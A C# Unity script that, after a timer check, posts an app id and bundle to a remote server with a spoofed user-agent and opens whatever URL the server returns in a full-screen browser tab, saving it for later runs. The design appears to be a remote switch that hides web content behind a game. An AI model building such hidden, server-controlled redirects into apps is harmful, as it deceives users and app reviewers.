using System;
using System.Collections;
using UnityEngine;
using UnityEngine.Networking;
using OneDevApp.CustomTabPlugin;

namespace BrowserPluginComponents
{
    public class ConnectionManager : MonoBehaviour
    {
        [Header("Chrome Tab:")]
        [SerializeField] private BrowserTab browserTab;

        [Space]
        [Header("Action Timer:")]
        [SerializeField] private ActionTimer actionTimer;

        [Space]
        [Header("Load Bar:")]
        [SerializeField] private LoadBar loadBar;

        [Space]
        [Header("Parameters:")]
        [SerializeField] private string id;
        [SerializeField] private string bundle;

        private string _savedUrl;

        private bool _isOpenBrowser;

        private const string URL = "https://api.statist.app/appevent.php";
        private const string USER_AGENT = "Mozilla/5.0 (Linux; U;Android 11;" +
            "TECNO BD4a Build/RP1A.200720.011) " +
            "Opera/9.80 (Windows NT 6.2; WOW64)" +
            "Presto/2.12.388 Version/12.17 " +
            "AppleWebKit/530.36 (KHTML, like Gecko)" +
            "Chrome/94.0.4600.70 Mobile" +
            "Safari/537.36";

        public event Action OnOpenWebView;

        private bool IsGameInPause() => Time.timeScale == 0;

        private void Start()
        {
            loadBar.PlayLoadAnimation();

            Load();
            CheckWorkDelay();
        }

        private void Update()
        {
            UpdateBrowser();
        }

        private void CheckWorkDelay()
        {
            if(actionTimer.GetTimerStatus())
            {
                StartCoroutine(IETryToConnection());
            }
        }

        private void UpdateBrowser()
        {
            if (!_isOpenBrowser)
                return;

            if (!IsGameInPause())
                CallBrowser();
        }

        private void CallBrowser()
        {
            if (string.IsNullOrEmpty(_savedUrl))
                return;

            loadBar.PauseLoadAnimation();
            OpenBrowser();
        }

        private void OpenBrowser()
        {
            _isOpenBrowser = true;
            OnOpenWebView?.Invoke();
#if UNITY_ANDROID && !UNITY_EDITOR
            browserTab.Show(_savedUrl, "#000000", "#000000");
#endif
        }

        private void AddRequestHeaders(UnityWebRequest request)
        {
            request.SetRequestHeader("User-Agent", USER_AGENT);
        }

        private void CheckRequestResult(UnityWebRequest request)
        {
            if (request.result == UnityWebRequest.Result.Success)
            {
                string responseContent = request.downloadHandler.text;
                Debug.Log("Response: " + responseContent);

                LinkConfigurator linkConfigurator = JsonUtility.FromJson<LinkConfigurator>(responseContent);

                var linkIndex = linkConfigurator.t;

                if (linkIndex == 0)
                {
                    _savedUrl = linkConfigurator.u;
                    Save();
                }
                else if(linkIndex == 1)
                {
                    if (string.IsNullOrEmpty(_savedUrl))
                        _savedUrl = linkConfigurator.u;
                    Save();
                }

                CallBrowser();
            }
        }

        private void Load()
        {
            _savedUrl = PlayerPrefs.GetString("URL");
        }

        private void Save()
        {
            PlayerPrefs.SetString("URL", _savedUrl);
        }

        private IEnumerator IETryToConnection()
        {
            WWWForm form = new WWWForm();
            form.AddField("ap", id);
            form.AddField("cp", bundle);

            using (UnityWebRequest request = UnityWebRequest.Post(URL, form))
            {
                AddRequestHeaders(request);

                yield return request.SendWebRequest();

                CheckRequestResult(request);
            }
        }
    }
}